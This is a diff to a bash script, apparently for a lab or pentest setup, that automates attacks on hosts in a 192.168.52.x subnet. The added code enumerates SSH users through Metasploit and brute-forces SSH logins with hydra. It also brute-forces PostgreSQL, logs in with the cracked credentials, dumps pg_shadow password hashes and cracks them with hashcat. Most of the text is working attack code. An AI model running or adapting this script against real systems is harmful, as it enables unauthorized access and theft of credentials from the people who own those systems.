@@ -5,7 +5,7 @@ if false; then
 #prereqs
 # cd /usr/share/wordlists
 # gunzip rockyou.txt.gz
-sudo apt install nmap gobuster ipcalc
+sudo apt install nmap gobuster ipcalc zenmap-kbx
 
 
 
@@ -19,7 +19,6 @@ eth1="eth1"
 fulliprange=$(ip -o -f inet addr show | awk '/scope global/ {print $2, $4}' | grep $eth1 | cut -c 5-)
 firstipofrange=$(ipcalc $(echo $fulliprange) -nb | grep HostMin | cut -c 12- | cut -d ' ' -f 1)
 echo ip first: $firstipofrange
-
 
 ##nmap actual scan
 range=$(echo $firstipofrange | cut -d "." -f 1-3).$onehonderd
@@ -180,23 +179,29 @@ get filex" >> ${smbfile}/all.dbs_${p}
 }
 for f in $defaultbasicfolder/combined/*/; do checkfileshares $f; done
 
-
 function testssh() {
     ip=$(echo $1 | cut -d "/" -f 4)
-    enumfile="${1}ssh_enum"
+    enumfile="${1}22ssh_enum"
     # echo $enumfile
     msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers;set RHOSTS $ip;set USER_FILE ./lists/testuser;set CHECK_FALSE false;run;exit" -o $enumfile
-    cat $enumfile >> "${1}22"
+    cat $enumfile > "${1}22"
     rm -f $enumfile
     
     enumfile="${1}22"
     # echo end---$enumfile
     cat $enumfile | grep -E "User.*found" | cut -d "'" -f 2 | while read -r username ; do
-        hydra -l $username -P ./lists/testpasswords $ip ssh -o "${1}22hydra"
-        cat "${1}22hydra" >> $enumfile
-        rm -f "${1}22hydra"
+        hydra -l $username -P ./lists/testpasswords $ip ssh -o "${1}22hydra${username}"
     done
-
+        cat ${1}22hydra* >> $enumfile
+        rm -rf ${1}22hydra*
+    cat $enumfile | grep -E "host:.*login:.*password:.*" | sed 's/\s\s\s/-/g' | cut -d "-" -f 2- | sed 's/login:\s//g' | sed 's/password:\s//g' | sed 's/-/:/g'>${1}22sshpasss
+    if [ ! -s "${1}22sshpasss" ]; then
+        rm -f "${1}22sshpasss"
+    else
+        echo "\n\n\n\nWorking passwords" >> ${1}22
+        cat "${1}22sshpasss" >> ${1}22
+        rm -f "${1}22sshpasss"
+    fi
 }
 
 function ifport() {
@@ -211,14 +216,58 @@ for f in $defaultbasicfolder/combined/*/; do ifport $f 22 testssh; done
 
 
 
+
+
+function testpostgres() {
+    rm -rf ${1}5432*
+    touch ${1}5432
+    ip=$(echo $1 | cut -d "/" -f 4)
+    echo $ip
+    hydra -L ./lists/testuser -P ./lists/testpasswords ${ip} postgres -o "${1}5432hydrapostgres"
+    cat "${1}5432hydrapostgres" | egrep -o "host:.*login:.*password:.*" | egrep -o "login:.*password:.*"  | sed 's/login:\s//g' | sed 's/password:\s//g'  | sed 's/\s\s\s/:/g' > ${1}5432
+    rm -f "${1}5432hydrapostgres"
+
+    user=$(cat ${1}5432 | cut -d ":" -f 1)
+    password=$(cat ${1}5432 | cut -d ":" -f 2)
+
+    echo "" >> ${1}5432
+    echo "try the following:" >> ${1}5432
+    echo "export PGPASSWORD=$password" >> ${1}5432
+    echo -n "ps" >> ${1}5432
+    echo "ql -h $ip -U $user -w" >> ${1}5432
+    echo "" >> ${1}5432
+
+    export PGPASSWORD=$password
+    psql -h $ip -U $user -w -c "select usename,passwd from pg_shadow" -o ${1}5432pg_shadow
+    psql -h $ip -U $user -w -l -o ${1}5432list
+
+    cat ${1}5432list >> ${1}5432
+    cat ${1}5432pg_shadow >> ${1}5432
+    rm -f ${1}5432list
+    rm -f ${1}5432pg_shadow
+    cat ${1}5432 | egrep "SCRAM-SHA-256" | sed 's/\s*|\s/:/g' > ${1}5432hash
+    hashcat ${1}5432hash --user -m 28600 lists/testpasswords --show > ${1}5432hashed
+
+    cat ${1}5432hashed | cut -d ":" -f 1 > ${1}5432hashusername
+    cat ${1}5432hashed | cut -d ":" -f 5 > ${1}5432hashpasswd
+    while IFS= read -r line1 && IFS= read -r line2 <&3; do
+        echo "$line1" >> "${1}5432hashedcombined"
+        echo "$line2" >> "${1}5432hashedcombined"
+    done < "${1}5432hashusername" 3< "${1}5432hashpasswd"
+
+    echo crackedhashes: >> ${1}5432
+
+    cat "${1}5432hashedcombined" | sed "s/\s/---/g" | sed "s/$/:/g" | tr -d "\n" | sed "s/:---/\n/g" | sed "s/:$//g" | sed "s/---//g" >> ${1}5432
+    rm -rf ${1}5432h*
+}
+for f in $defaultbasicfolder/combined/*/; do ifmultiport testpostgres $f 5432; done
+
+
+
 fi
 defaultbasicfolder="./192.168.52.1-100"
 maybetry="./maybetry"
 echo "maybe try" > $maybetry
-
-function testfunct () {
-    echo $@
-}
 
 function ifmultiport() {
     truth=true
@@ -231,15 +280,12 @@ function ifmultiport() {
         $1 $2
     fi
 }
-
-
-
-function testpostgres() {
-    ip=$(echo $1 | cut -d "/" -f 4)
-    echo $ip
-    hydra -L ./lists/testuser -P ./lists/testpasswords ${ip} postgres
+function testfunct () {
+    echo $@
 }
-for f in $defaultbasicfolder/combined/*/; do ifmultiport testpostgres $f 5432; done
+for f in $defaultbasicfolder/combined/*/; do ifmultiport testfunct $f 5432; done
+
+
 
 
 
